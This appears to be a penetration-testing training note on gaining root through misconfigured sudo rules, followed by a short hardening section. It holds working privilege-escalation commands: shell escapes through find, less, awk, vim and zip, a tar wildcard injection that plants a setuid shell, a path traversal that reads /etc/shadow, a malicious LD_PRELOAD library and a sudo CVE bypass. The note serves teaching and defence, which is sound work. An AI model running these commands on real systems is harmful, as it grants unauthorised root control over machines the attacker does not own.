---
tags: [linux, privesc, pentesting, red-team]
difficulty: advanced
module: "44 - Linux Privilege Escalation"
topic: "44.32 Insecure Sudo Rules"
---

# 44.32 Insecure Sudo Rules Exploitation

## 1. Introduction

The `sudo` (Superuser DO) utility is the cornerstone of access delegation in Linux, allowing system administrators to grant specific users or groups the ability to run designated commands as `root` (or another user) without sharing the root password. The configuration governing these permissions is defined in the `/etc/sudoers` file and the `/etc/sudoers.d/` directory.

While `sudo` is intended to enhance security by enforcing the principle of least privilege, misconfigured `sudo` rules are one of the most common and easily exploitable avenues for local privilege escalation. If an administrator grants a user `sudo` access to a binary that possesses unintended functionality—such as the ability to spawn a shell, read/write arbitrary files, load external libraries, or execute secondary commands—an attacker who compromises that user can bypass the intended restrictions and achieve full root access.

## 2. Architecture and Attack Flow

The following ASCII diagram illustrates how an insecure sudo rule allows an attacker to break out of the restricted execution context.

```text
+---------------------------------------------------------------------------------+
|                               Linux System                                      |
|                                                                                 |
|  +--------------------+                                                         |
|  | /etc/sudoers       |  Rule: "user ALL=(root) NOPASSWD: /usr/bin/find"        |
|  | Configuration      |                                                         |
|  +--------------------+                                                         |
|            |                                                                    |
|            v                                                                    |
|  +--------------------+  1. Attacker runs allowed command via sudo              |
|  | Unprivileged User  |  -----------------------------------------------+       |
|  | (Attacker Shell)   |  sudo /usr/bin/find . -exec /bin/sh \;          |       |
|  +--------------------+                                                 |       |
|                                                                         v       |
|                                                          +-------------------+  |
|                                                          | sudo Binary       |  |
|                                                          | (EUID = 0/root)   |  |
|                                                          +-------------------+  |
|                                                                 |               |
|                                           2. Sudo verifies rule |               |
|                                              (Match: /usr/bin/find)             |
|                                                                 |               |
|                                                                 v               |
|  +--------------------+  4. The `-exec` flag spawns      +-------------------+  |
|  | Root Shell!        |  a secondary shell, inheriting   | /usr/bin/find     |  |
|  | (Privilege         | <------------------------------- | (Running as root) |  |
|  |  Escalated)        |  the root privileges!            +-------------------+  |
|  +--------------------+                                                         |
+---------------------------------------------------------------------------------+
```

## 3. The 'Why': Understanding Sudo Misconfigurations

Why do these vulnerabilities occur?

1.  **Lack of Granularity:** Administrators often want to allow a user to perform a specific task (e.g., viewing logs with `less`, or restarting a service with `systemctl`) but fail to realize that the granted binary has built-in features (like interactive modes or shell escapes) that allow executing arbitrary commands.
2.  **Wildcards in Rules:** Using wildcards (e.g., `/bin/cat /var/log/*`) in the `sudoers` file is notoriously dangerous, as attackers can use directory traversal or command line injection to manipulate the wildcard expansion.
3.  **Environment Preservation:** If `sudo` is configured to preserve the user's environment (`env_keep`), attackers can inject malicious environment variables (like `LD_PRELOAD`, `LD_LIBRARY_PATH`, or `PYTHONPATH`) into the privileged process.

## 4. Enumerating Sudo Privileges

The first step in exploiting `sudo` is identifying what commands the compromised user is allowed to run.

```bash
# List allowed sudo commands for the current user
sudo -l

# If you have the user's password, you will be prompted. 
# If 'NOPASSWD' is set in the sudoers file, it will list them immediately.
```

Sample output:
```text
Matching Defaults entries for devuser on server01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User devuser may run the following commands on server01:
    (root) NOPASSWD: /usr/bin/find
    (root) /usr/bin/less /var/log/syslog
    (root) NOPASSWD: /usr/bin/awk
```

## 5. Exploitation Techniques

### 5.1 Shell Escapes (GTFOBins)
Many standard Linux utilities have interactive features that allow users to spawn subshells. If executed with `sudo`, the subshell inherits root privileges. The definitive resource for these is the **GTFOBins** project.

**Example 1: `find`**
The `find` utility has an `-exec` parameter meant to run a command on found files.
```bash
sudo find . -exec /bin/sh \; -quit
```

**Example 2: `less`, `more`, `man`**
Pagers allow you to execute shell commands from within their interactive view.
```bash
sudo less /var/log/syslog
# While inside less, type:
!/bin/sh
```

**Example 3: `awk`**
Text processing tools often have system command execution functions.
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

**Example 4: `vim` / `vi`**
Editors allow arbitrary shell command execution.
```bash
sudo vim -c '!sh'
```

### 5.2 Wildcard Exploitation
If a sudo rule contains a wildcard (`*`), an attacker can often abuse it.

**Vulnerable Rule:** `(root) NOPASSWD: /bin/cat /var/log/*`

**Exploitation via Path Traversal:**
```bash
sudo /bin/cat /var/log/../../../etc/shadow
```

**Vulnerable Rule:** `(root) NOPASSWD: /bin/tar -czvf /backup/*.tar.gz *`

**Exploitation via Checkpointing (tar specific):**
If the wildcard `*` expands to include filenames that look like `tar` flags, `tar` will execute them.
```bash
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint=1"
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > shell.sh
chmod +x shell.sh
sudo /bin/tar -czvf /backup/test.tar.gz *
```

### 5.3 LD_PRELOAD and Environment Preservation
If the `sudo -l` output shows `env_keep+=LD_PRELOAD`, the administrator has explicitly allowed the user to load custom shared libraries into privileged processes. `LD_PRELOAD` forces the dynamic linker to load a specific library *before* any others, allowing an attacker to hook and overwrite standard C library functions (like `printf` or `geteuid`).

**Exploitation:**
Create a malicious C library (`preload.c`):
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

// Overwrite the _init function, which runs when the library is loaded
void _init() {
    unsetenv("LD_PRELOAD"); // Clean up to avoid infinite loops
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Compile it as a shared object:
```bash
gcc -fPIC -shared -o /tmp/preload.so preload.c -nostartfiles
```

Run any allowed `sudo` command with the environment variable set:
```bash
sudo LD_PRELOAD=/tmp/preload.so find
```
The library is loaded, the `_init` function executes as root, and a root shell is spawned before `find` even starts.

### 5.4 Exploiting `sudo` CVEs
Historically, the `sudo` binary itself has had critical vulnerabilities that allow privilege escalation regardless of the sudoers configuration (e.g., if the user is simply in the sudoers file, or sometimes even if they aren't).

*   **CVE-2019-14287 (Sudo ID Bypass):** If a rule allows a user to run a command as any user EXCEPT root (e.g., `(ALL, !root)`), specifying the UID `-1` or `4294967295` bypassed the restriction. `sudo -u#-1 /bin/bash`.
*   **CVE-2021-3156 (Baron Samedit):** A devastating heap-based buffer overflow in `sudo` that allowed *any* local user (even those not in sudoers) to gain root by passing specifically crafted arguments ending in a single backslash.

## 6. Real-World Penetration Testing Scenario

During an engagement, you establish an SSH session as user `backup_operator`.

1.  **Enumeration:** You run `sudo -l` and discover:
    `User backup_operator may run the following commands on db-server:`
    `(root) NOPASSWD: /usr/bin/zip /backups/db_backup.zip /var/lib/mysql/*`
2.  **Analysis:** The administrator intended to allow this user to compress database files. However, the `zip` utility is known on GTFOBins to support command execution via the `-T` (test) and `-TT` (unzip command) flags.
3.  **Exploitation:** You execute the following:
    ```bash
    TF=$(mktemp -u)
    sudo zip $TF /var/lib/mysql/ibdata1 -T -TT 'sh # '
    ```
4.  **Result:** The `zip` command invokes `sh` to "test" the archive, immediately granting you an interactive `#` root prompt.

## 7. Defensive Hardening & Mitigation

To secure `sudo` configurations:

1.  **Strict Command Paths:** Always specify absolute paths to binaries (e.g., `/usr/bin/cat` instead of `cat`).
2.  **Avoid Wildcards:** Explicitly define the files a user can interact with. If dynamic input is needed, use a wrapper script that heavily sanitizes input, and grant `sudo` access only to that wrapper script.
3.  **Use `NOEXEC`:** `sudo` allows the `NOEXEC` tag in the sudoers file, which utilizes `LD_PRELOAD` natively to prevent the invoked command from calling `execve()` to spawn secondary commands.
    *   *Rule:* `user ALL=(root) NOEXEC: /usr/bin/less /var/log/syslog` (This prevents the `!/bin/sh` breakout in `less`).
4.  **Remove Insecure Environment Variables:** Do not use `env_keep` for variables like `LD_PRELOAD`, `LD_LIBRARY_PATH`, or language-specific paths like `PYTHONPATH`.
5.  **Audit Regularly:** Use tools like `LinPEAS` or manual review to audit `/etc/sudoers` against GTFOBins regularly.

## Chaining Opportunities
- Sudo enumerations should immediately follow obtaining a foothold via **[[02 - Web Application RCE]]** or **[[08 - SSH Hijacking and Key Theft]]**.
- If a custom script is allowed via sudo, check it for **[[31 - tmp Race Conditions]]** or **[[33 - Python Perl Ruby Library Hijacking]]**.

## Related Notes
- [[19 - Linux Process Enumeration]]
- [[24 - SUID vs SUDO Mechanisms]]
- [[35 - Defense File Permission Hardening]]
